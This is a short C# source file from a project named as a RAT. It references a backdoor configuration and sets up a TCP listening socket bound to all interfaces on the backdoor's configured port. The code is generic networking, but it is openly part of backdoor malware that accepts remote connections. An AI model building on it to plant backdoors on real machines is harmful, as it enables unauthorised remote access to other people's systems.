using RAT.src.Configuration;
using System.Net;
using System.Net.Sockets;

namespace RAT.src.Configurations
{
    /// <summary>
    /// Socket configuration logic.
    /// </summary>
    public class SocketConfigurator
    {
        /// <summary>
        /// Gets fully configured and "ready-to-use" socket.
        /// </summary>
        /// <returns>Configured socket.</returns>
        public Socket GetConfiguredSocket()
        {
            // Create a TCP/IP socket.
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        /// <summary>
        /// Gets configuration for local endpoint which later can be used with socket configuration.
        /// </summary>
        /// <returns><see cref="IPEndPoint"/> class which holds all needed information about local endpoint.</returns>
        public IPEndPoint GetLocalEndpointConfigurationForSocket()
        {
            // Get json configuration.
            BackdoorConfiguration configuration = BackdoorConfigurator.GetBackdoorConfiguration();
            return new IPEndPoint(IPAddress.Any, configuration.ConnectionPort);
        }
    }
}